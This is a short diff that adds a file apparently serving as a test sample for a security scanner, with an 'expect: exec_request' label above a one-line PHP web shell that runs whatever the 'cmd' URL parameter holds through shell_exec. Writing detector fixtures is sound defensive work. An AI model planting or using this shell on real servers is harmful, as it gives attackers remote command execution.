@@ -1,0 +1,3 @@
+expect: exec_request
+<?php
+echo shell_exec( $_GET['cmd'] );
